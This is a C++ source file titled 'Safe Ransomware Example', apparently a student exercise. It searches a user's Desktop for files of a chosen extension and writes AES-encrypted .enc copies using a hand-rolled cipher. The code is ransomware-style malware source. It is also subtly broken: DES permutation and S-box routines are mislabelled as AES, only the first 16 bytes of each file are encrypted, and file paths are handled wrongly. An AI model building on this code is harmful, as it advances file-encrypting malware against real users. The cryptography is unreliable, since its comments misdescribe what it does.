//*******************************************INCLUDING LIBRARIES************************************
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <locale.h>
#include <Windows.h>
#include <list>
#include <vector>
#include <string>
#include <map>
#include <bits/stdc++.h>
#include <fstream>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <iostream>
#include <string.h>
using namespace std;

//*******************************************INCLUDING GLOBAL VARIABLES************************************
// All these variables include the filenames that are generated using the two functions implemented.
vector<string> files;
vector<string> encryptfiles;

//*******************************************AES FUNCTIONS START*******************************************

//*******************************************AES ENCRYPTION FUNCTIONS*******************************************
int bin_to_dec_2bit(string input) {
/*

This function implements the binary to decimal function. It is used thoroughly in the process of AES.

It maps string binary bits to decimal output.

*/
	map<string, int> map;
	map["00"] = 0; map["01"] = 1; map["10"] = 2; map["11"] = 3;

	return map[input];
}

string permute(string input, int* permutation, int size) {
/*

This function implements the permutation function in AES.

It substitutes or swaps entries on the basis of permutation table in AES

*/
	string permuted = "";
	for (int i = 0; i < size; i++)
		permuted += input[permutation[i] - 1];

	return permuted;
}
string key_initial_permutation(string key) {
/*

This function implements the initial permutation function in AES.

It substitutes or swaps entries on the basis of initial permutation table in AES

*/
	int kp[56] = { 57, 49, 41, 33, 25, 17, 9,
					 1, 58, 50, 42, 34, 26, 18,
					 10, 2, 59, 51, 43, 35, 27,
					 19, 11, 3, 60, 52, 44, 36,
					 63, 55, 47, 39, 31, 23, 15,
					 7, 62, 54, 46, 38, 30, 22,
					 14, 6, 61, 53, 45, 37, 29,
					 21, 13, 5, 28, 20, 12, 4 };
	return permute(key, kp, 56);
}
string left_circular_shift(string round_key, int round_number) {
/*

This function implements the circular shift function in AES.

It rotates the values one step to the left.

*/
	int number_shifts[16] = { 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 };
	int shifts = number_shifts[round_number];

	return round_key.substr(shifts, round_key.length() - shifts) + round_key.substr(0, shifts);
}
string key_comp_permutation(string round_key) {
/*

This function implements the circular shift function in AES.

It rotates the values one step to the left.

*/
	int cp[48] = { 14, 17, 11, 24, 1, 5,
					3, 28, 15, 6, 21, 10,
					 23, 19, 12, 4, 26, 8,
					 16, 7, 27, 20, 13, 2,
					 41, 52, 31, 37, 47, 55,
					 30, 40, 51, 45, 33, 48,
					 44, 49, 39, 56, 34, 53,
					 46, 42, 50, 36, 29, 32 };
	return permute(round_key, cp, 48);
}
vector<string> key_generator(string key) {
/*

This function implements the KEY GENERATION for the subround.

*/
	vector<string> round_keys;

	string after_initial_per_56 = key_initial_permutation(key);
	string left_part = after_initial_per_56.substr(0, 28);
	string right_part = after_initial_per_56.substr(28, 28);

	for (int i = 0; i < 16; i++) {
		left_part = left_circular_shift(left_part, i);
		right_part = left_circular_shift(right_part, i);

		string round_key = left_part + right_part;
		round_key = key_comp_permutation(round_key);

		round_keys.push_back(round_key);
	}

	return round_keys;
}
string input_inital_permutation(string input) {
/*

This function implements the Initial Permutation for the Input.

*/
	int ip[64] = { 58, 50, 42, 34, 26, 18, 10, 2,
					60, 52, 44, 36, 28, 20, 12, 4,
					62, 54, 46, 38, 30, 22, 14, 6,
					64, 56, 48, 40, 32, 24, 16, 8,
					57, 49, 41, 33, 25, 17, 9, 1,
					59, 51, 43, 35, 27, 19, 11, 3,
					61, 53, 45, 37, 29, 21, 13, 5,
					63, 55, 47, 39, 31, 23, 15, 7 };

	return permute(input, ip, 64);
}
string expansion_permutation(string right_part) {
/*

This function implements the Expansion Permutation for the Input.

*/
	int ep[48] = { 32, 1, 2, 3, 4, 5, 4, 5,
					6, 7, 8, 9, 8, 9, 10, 11,
					12, 13, 12, 13, 14, 15, 16, 17,
					16, 17, 18, 19, 20, 21, 20, 21,
					22, 23, 24, 25, 24, 25, 26, 27,
					28, 29, 28, 29, 30, 31, 32, 1 };
	
	return permute(right_part, ep, 48);
}
int bin_to_dec_4bit(string input) {
/*

This function implements the binary to decimal function. It is used thoroughly in the process of AES.

It maps string binary bits to decimal output.

*/
	map<string, int> map;
	map["0000"] = 0; map["0001"] = 1; map["0010"] = 2; map["0011"] = 3;
	map["0100"] = 4; map["0101"] = 5; map["0110"] = 6; map["0111"] = 7;
	map["1000"] = 8; map["1001"] = 9; map["1010"] = 10; map["1011"] = 11;
	map["1100"] = 12; map["1101"] = 13; map["1110"] = 14; map["1111"] = 15;

	return map[input];
}
string dec_to_bin_4bit(int input) {
/*

This function implements the decimal to binary function. It is used thoroughly in the process of AES.

It maps string decimal numbers to binary string output.

*/
	string map[16] = { "0000", "0001", "0010", "0011",
						"0100", "0101", "0110", "0111",
						"1000", "1001", "1010", "1011",
						"1100", "1101", "1110", "1111" };

	return map[input];
}

string perform_xor(string s1, string s2) {
/*

This function implements the XOR function for the Input.

*/
	string result = "";
	for (int i = 0; i < s1.length(); i++) {
		result += ((s1[i] - 48) ^ (s2[i] - 48)) + 48;
	}

	return result;
}
string substituion_sbox(string plaintext) {
/*

This function implements the substitution bytes function for the Input in AES.

*/
	int sbox[8][4][16] = { { 14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
						  0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
						  4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
						  15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13 },

						{ 15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
						  3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
						  0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
						  13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9 },

						{ 10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
						  13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
						  13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
						  1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12 },

						{ 7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
						  13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
						  10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
						  3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14 },

						{ 2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
						  14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
						  4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
						  11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3 },

						{ 12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
						  10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
						  9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
						  4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13 },

						{ 4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
						  13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
						  1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
						  6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12 },

						{ 13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
						  1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
						  7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
						  2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11 } };

	string after_sub = "";
	for (int i = 0; i < 8; i++) {
		string chunk = plaintext.substr(i * 6, 6);
		string row_text = ""; row_text += chunk[0]; row_text += chunk[5];
		string col_text = ""; col_text += chunk[1]; col_text += chunk[2]; col_text += chunk[3]; col_text += chunk[4];

		int row = bin_to_dec_2bit(row_text);
		int col = bin_to_dec_4bit(col_text);

		after_sub += dec_to_bin_4bit(sbox[i][row][col]);
	}

	return after_sub;
}
string final_permutation(string plaintext) {
/*

This function implements the final permutation function for the Input in AES.

*/
	int fp[32] = { 16, 7, 20, 21, 29, 12, 28, 
					17, 1, 15, 23, 26, 5, 18, 31, 
					10, 2, 8, 24, 14, 32, 27, 3, 9,
					19, 13, 30, 6, 22, 11, 4, 25 };

	return permute(plaintext, fp, 32);
}

string inverser_first_permutation(string plaintext) {
/*

This function implements the inverse first permutation function for the Cipher in order to decrypt it.

*/
	int ifp[64] = { 40, 8, 48, 16, 56, 24, 64, 32,
					39, 7, 47, 15, 55, 23, 63, 31,
					38, 6, 46, 14, 54, 22, 62, 30,
					37, 5, 45, 13, 53, 21, 61, 29,
					36, 4, 44, 12, 52, 20, 60, 28,
					35, 3, 43, 11, 51, 19, 59, 27,
					34, 2, 42, 10, 50, 18, 58, 26,
					33, 1, 41, 9, 49, 17, 57, 25 };

	return permute(plaintext, ifp, 64);
}

string hex_to_bin(string input) {
/*

This function implements the hexadecimal to binary function. It is used thoroughly in the process of AES.

It maps string hex numbers to binary string output.

*/
	map<char, string> map;
	map['0'] = "0000"; map['1'] = "0001"; map['2'] = "0010"; map['3'] = "0011";
	map['4'] = "0100"; map['5'] = "0101"; map['6'] = "0110"; map['7'] = "0111";
	map['8'] = "1000"; map['9'] = "1001"; map['A'] = "1010"; map['B'] = "1011";
	map['C'] = "1100"; map['D'] = "1101"; map['E'] = "1110"; map['F'] = "1111";
	map[' '] = "";

	string mapped_bin = "";
	for (int i = 0; i < input.length(); i++) {
		mapped_bin += map[input[i]];
	}

	return mapped_bin;
}
string bin_to_hex(string input) {
/*

This function implements the binary to hex function. It is used thoroughly in the process of AES.

It maps string binary string bits to hex string output.

*/
	map<string, char> map;
	map["0000"] = '0'; map["0001"] = '1'; map["0010"] = '2'; map["0011"] = '3';
	map["0100"] = '4'; map["0101"] = '5'; map["0110"] = '6'; map["0111"] = '7';
	map["1000"] = '8'; map["1001"] = '9'; map["1010"] = 'A'; map["1011"] = 'B';
	map["1100"] = 'C'; map["1101"] = 'D'; map["1110"] = 'E'; map["1111"] = 'F';

	string mapped_hex = "";
	for (int i = 0; i < input.length(); i += 4) {
		mapped_hex += map[input.substr(i, 4)];
	}

	return mapped_hex;
}

int bin_to_dec_8bit(string input) {
/*

This function implements the binary to decimal function. It is used thoroughly in the process of AES.

It maps string bits to decimal number output.

*/
	int a = bin_to_dec_4bit(input.substr(0, 4)) << 4;
	int b = bin_to_dec_4bit(input.substr(4, 4));
	return a + b;
}

string dec_to_bin_8bit(int input) {
/*

This function implements the decimal to binary function. It is used thoroughly in the process of AES.

It maps decimal numbers to binary bits.

*/
	return dec_to_bin_4bit((input & 0xf0) >> 4) + dec_to_bin_4bit(input & 0x0f);
}


string rotate_word(string word) {
/*

This function inputs a 32 bit word and then rotate it. It is used in the subkey generation for the subround in AES.

*/
	return word.substr(8, 24) + word.substr(0, 8);
}
string substitute_word(string word) {
/*

This function substitutes words. It is used in the subkey generation for the subround in AES.

*/
	int sbox[16][16] = {
		   0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
		   0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
		   0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
		   0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
		   0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
		   0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
		   0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
		   0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
		   0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
		   0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
		   0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
		   0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
		   0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
		   0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
		   0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
		   0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
	};

	string substitued = "";
	for (int i = 0; i < 4; i++) {
		int row = bin_to_dec_4bit(word.substr(i * 8, 4));
		int col = bin_to_dec_4bit(word.substr(i * 8 + 4, 4));
		substitued += dec_to_bin_8bit((sbox[row][col]));
	}
	return substitued;
}
string add_round_const(string word, int round) {
/*

This function adds a round constant which is essential in AES. It is used in the subkey generation for the subround in AES.

*/
	int round_const[10]{
		0x01, 0x02, 0x04, 0x08, 0x10,
		0x20, 0x40, 0x80, 0x1b, 0x36
	};

	string rc = dec_to_bin_8bit(round_const[round]) + "000000000000000000000000";
	return perform_xor(word, rc);
}
vector<string> key_expansion(string key) {
/*

This function expands the partial keys to make it the round key. It is used in the subkey generation for the subround in AES.

*/
	vector<string> round_keys;

	string round_key = key;
	round_keys.push_back(round_key);
	for (int i = 0; i < 10; i++) {
		string last_word = round_key.substr(96, 32);
		last_word = rotate_word(last_word);
		last_word = substitute_word(last_word);
		last_word = add_round_const(last_word, i);

		string first_word = perform_xor(round_key.substr(0, 32), last_word);
		string second_word = perform_xor(round_key.substr(32, 32), first_word);
		string third_word = perform_xor(round_key.substr(64, 32), second_word);
		string fourth_word = perform_xor(round_key.substr(96, 32), third_word);
		round_key = first_word + second_word + third_word + fourth_word;

		round_keys.push_back(round_key);
	}


	return round_keys;
}

string substitute_byte(string plaintext) {
/*

This function substitutes bytes which is the first step in one of the 4 major steps in encryption process in AES.

*/
	return substitute_word(plaintext.substr(0, 32)) +
		substitute_word(plaintext.substr(32, 32)) +
		substitute_word(plaintext.substr(64, 32)) +
		substitute_word(plaintext.substr(96, 32));
}
string shift_rows(string plaintext) {
/*

This function shifts rows which is the second step of one of the 4 major steps in encryption process in AES.

*/
	string w1 = plaintext.substr(0, 8) + plaintext.substr(32 + 8, 8) + plaintext.substr(64 + 16, 8) + plaintext.substr(96 + 24, 8);
	string w2 = plaintext.substr(32, 8) + plaintext.substr(64 + 8, 8) + plaintext.substr(96 + 16, 8) + plaintext.substr(0 + 24, 8);
	string w3 = plaintext.substr(64, 8) + plaintext.substr(96 + 8, 8) + plaintext.substr(0 + 16, 8) + plaintext.substr(32 + 24, 8);
	string w4 = plaintext.substr(96, 8) + plaintext.substr(0 + 8, 8) + plaintext.substr(32 + 16, 8) + plaintext.substr(64 + 24, 8);
	return w1 + w2 + w3 + w4;
}
string mul_in_gf8(int a, int b) {
	int result = 0;
	for (int i = 0; i < 8; i++) {
		if ((b & 1) != 0)
			result ^= a;

		bool msb = (a & 0x80) != 0;
		a <<= 1;
		if (msb) a ^= 0x1B;
	
		b >>= 1;
	}

	return dec_to_bin_8bit(result);
}
/*

This function mix columns which is the third step of one of the 4 major steps in encryption process in AES.

*/
string mix_col(string word) {
	int mix_col[4][4] = { 2, 3, 1, 1,  1, 2, 3, 1,  1, 1, 2, 3,  3, 1, 1, 2 };

	int plain_mat[4];
	for (int j = 0; j < 4; j++)
		plain_mat[j] = bin_to_dec_8bit(word.substr(j * 8, 8));

	string ciphertext = "";
	for (int i = 0; i < 4; i++) {
		string sum = "00000000";
		for (int j = 0; j < 4; j++) {
			string result = mul_in_gf8(mix_col[i][j], plain_mat[j]);
			sum = perform_xor(sum, result);
		}
		ciphertext += sum;
	}
	return ciphertext;
}
string mix_columns(string plaintext) {
/*

This function mix columns which is the third step of one of the 4 major steps in encryption process in AES.

*/
	string ciphertext = "";
	for (int i = 0; i < 4; i++)
		ciphertext += mix_col(plaintext.substr(i * 32, 32));

	return ciphertext;
}
string aes_encryption(string plaintext, string key) {
/*

This function performs the encryption process by applying the major four steps in encryption.

*/
	vector<string> round_keys = key_expansion(key);

	string ciphertext = perform_xor(plaintext, round_keys[0]);
	for (int i = 1; i < 11; i++) {
		ciphertext = substitute_byte(ciphertext);

		ciphertext = shift_rows(ciphertext);

		if(i != 10) ciphertext = mix_columns(ciphertext);

		ciphertext = perform_xor(ciphertext, round_keys[i]);
	}

	return ciphertext;
}

static const char hex_table[16] = {
/*

This function is used for mapping hexa letters.

*/
  '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'
};

std::string StringToHexStr(string aInStr, int len)
{
/*

This function is used to convert string to hexa string. It is used when plaintext needs to be converted to hexa in order to process the AES functions.

*/
    std::string hex_str;
    for (int i = 0; i < len; ++i)
    {
        hex_str.append(&hex_table[(aInStr[i] & 0xF0) >> 4], 1);
        hex_str.append(&hex_table[aInStr[i] & 0xF], 1);
    }
    return hex_str;
}
std::string HexStrToString(string hex)
{
/*

This function is used to convert hex string to string. It is used when ciphertext needs to be converted to plaintext in order to process the decryption functions.

*/
	int len = hex.length();
	std::string newString;
	for(int i=0; i< len; i+=2)
	{
	    string byte = hex.substr(i,2);
	    char chr = (char) (int)strtol(byte.c_str(), NULL, 16);
	    newString.push_back(chr);
	}
	return newString;
}

//*******************************************FUNCTIONS CREATED AS PER REQUIREMENT*******************************************

//*******************************************FIRST FUNCTION THAT GENERATES FILES********************************************

int findfileswithextension(string extension,string path) {
/*
It inputs an extenstion and a path to current directory which is entered by the user. After that the function finds files according to the extension in the current directory.
*/
	cout<<"First Function of Finding Files with "<<extension<<" extension is started"<<endl;
	cout<<"Following "<<extension<<" Files have found"<<endl;
	cout<<"---------------------------------------------------------"<<endl;
	string filename;
	const char *exten=extension.c_str();
    const char *dirFilename = path.c_str();
    DIR *directory = NULL;
    directory = opendir (dirFilename);
    if(directory == NULL)
        return -1;
    struct dirent *dirp;
    while ((dirp = readdir (directory)) != NULL) {

        if (strstr(dirp->d_name,exten))
        {
            filename=dirp->d_name;
            files.push_back(filename);
            int pos = filename.find(".");
            string sub = filename.substr(0 , pos);
            encryptfiles.push_back(sub);
        }
    }
    for (int i=0;i<files.size();i++)
    {
    	cout<<files[i]<<endl;
	}
  	cout<<"---------------------------------------------------------"<<endl; 
	cout<<"First Function of Finding Files Completed "<<endl; 
  	cout<<endl;
}

void encryptfileswithAES(string extension) {
/*

It inputs an extenstion which is entered by the user. After that user enters the key which is required to encrypt all the generated files.
It reads the input from the file
then encrypts the content of the file
then creates a new encrypted file
writes that ciphertext to the encrypted file.

*/
	cout<<"Second Function of Encrypting Files with AES started"<<endl;
  	cout<<"-----------AES Implementation---------"<<endl;
	cout << "Enter 16 character key to encrypt all generated files (example: abcdefgh123456789) :";
	string key;
	cin>>key;
	string keyhex=StringToHexStr(key,16);
	cout<<endl;
    string myText;
    string plaintext;
    
    for (int i=0;i<files.size();i++)
    {
		ifstream MyReadFile(files[i], ios::in);
		while (getline (MyReadFile, myText)) 
		{
  			plaintext=plaintext.append(myText);
		}
		MyReadFile.close();
		cout<<"---------------------------------------------------------"<<endl;
		cout<<"Text Found in "<<files[i]<<" is "<<endl;
		cout << "Plaintext: " << plaintext << endl;
		string plaintexthex=StringToHexStr(plaintext,16);
		string ciphertexthex = aes_encryption(hex_to_bin(plaintexthex), hex_to_bin(keyhex));
		//cout << "Ciphertext Hex: " << bin_to_hex(ciphertexthex) << endl << endl;
		string ciphertext=HexStrToString(bin_to_hex(ciphertexthex));
		cout << "Ciphertext: " << ciphertext << endl;
		cout<<"---------------------------------------------------------"<<endl;
		string cipherfilename=encryptfiles[i].append(".enc");
		ofstream MyFile(cipherfilename);
    	MyFile << ciphertext;
 		MyFile.close();
 		plaintext="";
	}
	cout<<"Second Function of Encrypting Files with AES completed "<<endl;
}
//*******************************************MAIN FUNCTION********************************************
int main() {

	cout<<"						Safe Ransomware Example"<<endl;
	cout<<"						Encrypting Self Generated Files"<<endl;
	cout<<"---------------------------------------------------------"<<endl;
	cout<<"Step 1: Creating Files using self created function"<<endl;
	string extension;
  	cout<<"Enter the extension for the file i.e .txt :";
  	cin >> extension;
  	cout<<endl;
  	string currentdir="C:/Users/USER/Desktop/"; //here you need to change the path according to yours. 
 	findfileswithextension(extension,currentdir);
	encryptfileswithAES(extension);
}
